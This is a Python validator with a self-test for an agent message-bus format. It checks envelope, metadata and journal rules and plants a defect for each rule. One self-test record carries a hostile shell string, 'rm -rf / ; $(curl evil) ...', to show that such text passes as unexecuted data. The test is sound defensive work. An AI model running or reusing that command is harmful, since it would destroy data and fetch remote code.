#!/usr/bin/env python3
# Copyright Amazon.com, Inc. or its affiliates. All Rights Reserved.
# SPDX-License-Identifier: Apache-2.0
"""bus-v1-check.py - validate a bus v1 projection root (and optionally a journal segment) against BUS-V1.md.

  python3 bus-v1-check.py <projection-root> [--journal <segment.jsonl>]
      exit 0 = every inbox record and journal line is valid v1; 2 = the first violation (file, line, rule)
  python3 bus-v1-check.py --self-test
      plants one defect per rule into copies of examples/ and asserts each copy is REFUSED while the pristine copy PASSES;
      exit 0 = the checker discriminates, 1 = a planted defect was accepted

Rules (BUS-V1.md sections 3-5). stdlib only. A record whose text is a shell command is VALID DATA: nothing here evaluates text.
"""
import copy, hashlib, json, os, re, shutil, sys, tempfile

AGENT_ID = re.compile(r"[A-Za-z0-9][A-Za-z0-9._-]{0,63}\Z")
RESERVED = {"operator", "human", "system", "root", "broker", "launcher"}
UUID = re.compile(r"[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}\Z")
TS = re.compile(r"[0-9]{4}-[0-9]{2}-[0-9]{2}T[0-9]{2}:[0-9]{2}:[0-9]{2}\.[0-9]{3}Z\Z")
KINDS = ("request", "reply", "notice", "error")
ORIGINS = ("agent", "operator", "system")
TEXT_MAX = 16384
DETAILS_MAX = 2048
EVENTS = {"message.accepted", "delivery.started", "context.supplied", "message.read", "message.replied", "message.completed",
          "message.denied", "request.denied", "approval.required", "intake.rejected", "delivery.failed", "delivery.unknown",
          "message.expired", "segment.sealed", "agent.registered", "agent.generation", "capability.issued", "capability.revoked"}
ACTORS_EXTRA = {"broker", "launcher", "operator"}
HERE = os.path.dirname(os.path.abspath(__file__))
EXAMPLES = os.path.join(HERE, "examples")


class Violation(Exception):
    pass


def no_dup_pairs(pairs):
    seen = set()
    for k, _ in pairs:
        if k in seen:
            raise Violation(f"duplicate key {k!r}")
        seen.add(k)
    return dict(pairs)


def load_line(line, where):
    try:
        return json.loads(line, object_pairs_hook=no_dup_pairs)
    except Violation as e:
        raise Violation(f"{where}: {e}")
    except ValueError as e:
        raise Violation(f"{where}: not JSON ({e})")


def check_agent_id(v, field, where):
    if not isinstance(v, str) or not AGENT_ID.match(v):
        raise Violation(f"{where}: {field} is not an agent id: {v!r}")
    if v.lower() in RESERVED:
        raise Violation(f"{where}: {field} is a reserved name: {v!r}")


def check_envelope(env, where):
    if not isinstance(env, dict):
        raise Violation(f"{where}: envelope is not an object")
    keys = {"v", "id", "from", "to", "ts", "kind", "text", "reply_to"}
    if set(env) != keys:
        raise Violation(f"{where}: envelope keys {sorted(set(env) ^ keys)} differ from the v1 set")
    if not (isinstance(env["v"], int) and not isinstance(env["v"], bool) and env["v"] == 1):
        raise Violation(f"{where}: v must be the integer 1, got {env['v']!r}")
    if not isinstance(env["id"], str) or not UUID.match(env["id"]):
        raise Violation(f"{where}: id is not a lower-case UUID: {env['id']!r}")
    check_agent_id(env["from"], "from", where)
    check_agent_id(env["to"], "to", where)
    if env["from"] == env["to"]:
        raise Violation(f"{where}: from and to are the same agent")
    if not isinstance(env["ts"], str) or not TS.match(env["ts"]):
        raise Violation(f"{where}: ts is not UTC with milliseconds and Z: {env['ts']!r}")
    if env["kind"] not in KINDS:
        raise Violation(f"{where}: kind {env['kind']!r} is not one of {KINDS}")
    t = env["text"]
    if not isinstance(t, str) or not t.strip():
        raise Violation(f"{where}: text is empty or not a string")
    if len(t.encode("utf-8")) > TEXT_MAX:
        raise Violation(f"{where}: text is {len(t.encode('utf-8'))} bytes, over {TEXT_MAX}")
    if re.search(r"[\x00-\x08\x0b\x0c\x0e-\x1f\x7f-\x9f\u202a-\u202e\u2066-\u2069]|\x1b\[|\x1b\]", t):
        raise Violation(f"{where}: text carries terminal or bidi control characters (not normalized)")
    r = env["reply_to"]
    if r is not None and (not isinstance(r, str) or not UUID.match(r)):
        raise Violation(f"{where}: reply_to is neither null nor a UUID: {r!r}")
    if env["kind"] == "reply" and r is None:
        raise Violation(f"{where}: a reply carries no reply_to")


def check_meta(meta, where):
    if not isinstance(meta, dict):
        raise Violation(f"{where}: meta is not an object")
    keys = {"seq", "conversation_id", "causation_id", "from_generation", "to_generation", "origin", "assurance"}
    if set(meta) != keys:
        raise Violation(f"{where}: meta keys {sorted(set(meta) ^ keys)} differ from the v1 set")
    for k in ("seq", "from_generation", "to_generation"):
        if not isinstance(meta[k], int) or isinstance(meta[k], bool) or meta[k] < 1:
            raise Violation(f"{where}: meta.{k} must be a positive integer, got {meta[k]!r}")
    if not isinstance(meta["conversation_id"], str) or not UUID.match(meta["conversation_id"]):
        raise Violation(f"{where}: meta.conversation_id is not a UUID")
    c = meta["causation_id"]
    if c is not None and (not isinstance(c, str) or not UUID.match(c)):
        raise Violation(f"{where}: meta.causation_id is neither null nor a UUID")
    if meta["origin"] not in ORIGINS:
        raise Violation(f"{where}: meta.origin {meta['origin']!r} is not one of {ORIGINS}")
    if meta["assurance"] != "cooperative":
        raise Violation(f"{where}: meta.assurance must be 'cooperative' in v1, got {meta['assurance']!r}")


def canonical_hash(env, meta):
    data = json.dumps({"env": env, "meta": meta}, sort_keys=True, separators=(",", ":"), ensure_ascii=False).encode("utf-8")
    return hashlib.sha256(data).hexdigest()


def check_record(rec, where):
    if not isinstance(rec, dict) or set(rec) != {"env", "meta", "hash"}:
        raise Violation(f"{where}: an inbox record has the keys env, meta, hash and nothing else")
    check_envelope(rec["env"], where)
    check_meta(rec["meta"], where)
    want = canonical_hash(rec["env"], rec["meta"])
    if rec["hash"] != want:
        raise Violation(f"{where}: hash mismatch (record {str(rec['hash'])[:12]}..., canonical {want[:12]}...)")


def check_inbox(path, agent_id):
    check_agent_id(agent_id, "inbox directory", path)
    n = 0
    with open(path, encoding="utf-8") as f:
        for lineno, line in enumerate(f, 1):
            if not line.strip():
                raise Violation(f"{path}:{lineno}: blank line in an append-only inbox")
            rec = load_line(line, f"{path}:{lineno}")
            check_record(rec, f"{path}:{lineno}")
            if rec["env"]["to"] != agent_id:
                raise Violation(f"{path}:{lineno}: a record for {rec['env']['to']!r} in {agent_id!r}'s inbox")
            n += 1
    return n


def check_journal(path, seq_start=None):
    prev = seq_start
    n = 0
    sealed = False
    with open(path, encoding="utf-8") as f:
        for lineno, line in enumerate(f, 1):
            where = f"{path}:{lineno}"
            if sealed:
                raise Violation(f"{where}: a line after segment.sealed")
            if not line.strip():
                raise Violation(f"{where}: blank line in the journal")
            ev = load_line(line, where)
            keys = {"v", "seq", "ts", "event", "id", "actor", "generation", "attempt", "details"}
            if not isinstance(ev, dict) or set(ev) != keys:
                raise Violation(f"{where}: journal keys {sorted(set(ev) ^ keys) if isinstance(ev, dict) else '?'} differ from the v1 set")
            if not (isinstance(ev["v"], int) and not isinstance(ev["v"], bool) and ev["v"] == 1):
                raise Violation(f"{where}: v must be the integer 1")
            if not isinstance(ev["seq"], int) or isinstance(ev["seq"], bool) or ev["seq"] < 1:
                raise Violation(f"{where}: seq must be a positive integer")
            if prev is not None and ev["seq"] != prev + 1:
                raise Violation(f"{where}: seq {ev['seq']} does not follow {prev}")
            prev = ev["seq"]
            if not isinstance(ev["ts"], str) or not TS.match(ev["ts"]):
                raise Violation(f"{where}: ts is not UTC with milliseconds and Z")
            if ev["event"] not in EVENTS:
                raise Violation(f"{where}: event {ev['event']!r} is not a v1 event")
            if ev["id"] is not None and (not isinstance(ev["id"], str) or not UUID.match(ev["id"])):
                raise Violation(f"{where}: id is neither null nor a UUID")
            if ev["actor"] not in ACTORS_EXTRA:
                check_agent_id(ev["actor"], "actor", where)
            if ev["generation"] is not None and (not isinstance(ev["generation"], int) or ev["generation"] < 1):
                raise Violation(f"{where}: generation is neither null nor a positive integer")
            if ev["attempt"] is not None and (not isinstance(ev["attempt"], str) or not UUID.match(ev["attempt"])):
                raise Violation(f"{where}: attempt is neither null nor a UUID")
            if not isinstance(ev["details"], dict):
                raise Violation(f"{where}: details is not an object")
            if len(json.dumps(ev["details"], ensure_ascii=False).encode("utf-8")) > DETAILS_MAX:
                raise Violation(f"{where}: details over {DETAILS_MAX} bytes")
            if ev["event"] == "message.accepted":
                if "env" not in ev["details"] or "meta" not in ev["details"]:
                    raise Violation(f"{where}: message.accepted without details.env and details.meta")
                check_envelope(ev["details"]["env"], where)
                check_meta(ev["details"]["meta"], where)
                if ev["id"] != ev["details"]["env"]["id"]:
                    raise Violation(f"{where}: message.accepted id differs from its envelope's id")
            if ev["event"] in ("message.read", "message.replied", "message.completed", "message.denied", "delivery.started",
                               "context.supplied", "intake.rejected", "delivery.failed", "delivery.unknown", "message.expired") and ev["id"] is None:
                raise Violation(f"{where}: {ev['event']} without a message id")
            if ev["event"] == "segment.sealed":
                d = ev["details"]
                if d.get("last_seq") != ev["seq"] - 1 or not isinstance(d.get("hash"), str) or not re.match(r"[0-9a-f]{64}\Z", d["hash"]):
                    raise Violation(f"{where}: segment.sealed must carry last_seq = its seq - 1 and a sha256 hash")
                sealed = True
            n += 1
    return n


def check_root(root, journal=None):
    inboxes = 0
    records = 0
    for name in sorted(os.listdir(root)):
        p = os.path.join(root, name)
        if os.path.isdir(p):
            inbox = os.path.join(p, "inbox.jsonl")
            if os.path.exists(inbox):
                records += check_inbox(inbox, name)
                inboxes += 1
        elif name == "log.jsonl":
            check_journal(p)
    if inboxes == 0:
        raise Violation(f"{root}: no <agent_id>/inbox.jsonl under the projection root (an empty check is not a pass)")
    events = check_journal(journal) if journal else 0
    return {"inboxes": inboxes, "records": records, "journal_events": events}


def self_test():
    base = os.path.join(EXAMPLES, "mailbox")
    journal = os.path.join(EXAMPLES, "journal-000001.jsonl")
    try:
        summary = check_root(base, journal)
    except Violation as e:
        print(f"SELF-TEST FAILED: the pristine examples were refused: {e}")
        return 1
    print(f"pristine examples pass: {summary}")
    inbox_rel = os.path.join("agent", "inbox.jsonl")

    def mutate_record(fn):
        rec = json.loads(open(os.path.join(base, inbox_rel), encoding="utf-8").readline())
        return fn(copy.deepcopy(rec))

    def rehash(rec):
        rec["hash"] = canonical_hash(rec["env"], rec["meta"])
        return rec

    def with_env(k, v):
        def f(rec):
            rec["env"][k] = v
            return rehash(rec)
        return f

    cases = [
        ("v is 2", with_env("v", 2)),
        ("id not a UUID", with_env("id", "msg-1")),
        ("from is a reserved name", with_env("from", "operator")),
        ("to is a list (broadcast)", with_env("to", ["agent", "kube"])),
        ("ts without milliseconds", with_env("ts", "2026-10-14T00:00:00Z")),
        ("kind is alert", with_env("kind", "alert")),
        ("text is empty", with_env("text", "")),
        ("text carries an ANSI sequence", with_env("text", "red \x1b[31mtext")),
        ("reply_to is not a UUID", with_env("reply_to", "the previous one")),
        ("a reply without reply_to", lambda rec: rehash({**rec, "env": {**rec["env"], "kind": "reply", "reply_to": None}})),
        ("an unknown envelope field", lambda rec: rehash({**rec, "env": {**rec["env"], "priority": "high"}})),
        ("meta.origin unknown", lambda rec: rehash({**rec, "meta": {**rec["meta"], "origin": "slack"}})),
        ("meta.assurance separated in v1", lambda rec: rehash({**rec, "meta": {**rec["meta"], "assurance": "separated"}})),
        ("hash mismatch", lambda rec: {**rec, "hash": "0" * 64}),
        ("a record in the wrong inbox", lambda rec: rehash({**rec, "env": {**rec["env"], "to": "kube"}})),
    ]
    failed = 0
    with tempfile.TemporaryDirectory() as tmp:
        for i, (label, fn) in enumerate(cases):
            case = os.path.join(tmp, f"case{i}")
            shutil.copytree(base, case)
            rec = mutate_record(fn)
            with open(os.path.join(case, inbox_rel), "a", encoding="utf-8") as f:
                f.write(json.dumps(rec, ensure_ascii=False) + "\n")
            try:
                check_root(case)
                print(f"FAIL  accepted: {label}")
                failed += 1
            except Violation as e:
                print(f"PASS  rejected: {label} -- {str(e)[-90:]}")
        # a duplicate key inside a record (raw text, since json.dumps cannot produce one)
        case = os.path.join(tmp, "dup")
        shutil.copytree(base, case)
        with open(os.path.join(case, inbox_rel), "a", encoding="utf-8") as f:
            f.write('{"env": {}, "env": {}, "meta": {}, "hash": ""}\n')
        try:
            check_root(case); print("FAIL  accepted: duplicate key"); failed += 1
        except Violation as e:
            print(f"PASS  rejected: duplicate key -- {str(e)[-60:]}")
        # journal defects
        lines = open(journal, encoding="utf-8").read().splitlines()
        jcases = [
            ("journal seq skips", lambda ls: ls[:1] + [json.dumps({**json.loads(ls[1]), "seq": json.loads(ls[1])["seq"] + 1})] + ls[2:]),
            ("journal unknown event", lambda ls: ls[:1] + [json.dumps({**json.loads(ls[1]), "event": "message.sent"})] + ls[2:]),
            ("journal message.accepted without its envelope", lambda ls: [json.dumps({**json.loads(ls[0]), "details": {}})] + ls[1:]),
            ("journal line after the seal", lambda ls: ls + [ls[-2]]),
            ("journal actor reserved but not a bus role", lambda ls: ls[:1] + [json.dumps({**json.loads(ls[1]), "actor": "root"})] + ls[2:]),
        ]
        for label, fn in jcases:
            jp = os.path.join(tmp, label.replace(" ", "-") + ".jsonl")
            with open(jp, "w", encoding="utf-8") as f:
                f.write("\n".join(fn(list(lines))) + "\n")
            try:
                check_journal(jp); print(f"FAIL  accepted: {label}"); failed += 1
            except Violation as e:
                print(f"PASS  rejected: {label} -- {str(e)[-80:]}")
        # the shell-command text is valid data: it must pass, verbatim, unexecuted
        case = os.path.join(tmp, "cmd")
        shutil.copytree(base, case)
        rec = mutate_record(with_env("text", "rm -rf / ; $(curl evil) `id` && echo approved"))
        with open(os.path.join(case, inbox_rel), "a", encoding="utf-8") as f:
            f.write(json.dumps(rec, ensure_ascii=False) + "\n")
        try:
            check_root(case); print("PASS  accepted as data: a text that is a shell command")
        except Violation as e:
            print(f"FAIL  refused valid data: {e}"); failed += 1
    if failed:
        print(f"SELF-TEST FAILED: {failed} case(s)")
        return 1
    print(f"SELF-TEST PASSED - the checker discriminates ({len(cases) + 1 + len(jcases)} planted defects rejected, the pristine examples and the command-as-data record accepted)")
    return 0


def main(argv):
    if argv[1:2] == ["--self-test"]:
        return self_test()
    if not argv[1:]:
        print(__doc__)
        return 2
    root = argv[1]
    journal = None
    if "--journal" in argv:
        journal = argv[argv.index("--journal") + 1]
    try:
        summary = check_root(root, journal)
    except Violation as e:
        print(f"BUS V1 VIOLATION: {e}")
        return 2
    except OSError as e:
        print(f"BUS V1 VIOLATION: unreadable: {e}")
        return 2
    print(f"OK: {root} is a valid bus v1 projection root - {summary}")
    return 0


if __name__ == "__main__":
    sys.exit(main(sys.argv))
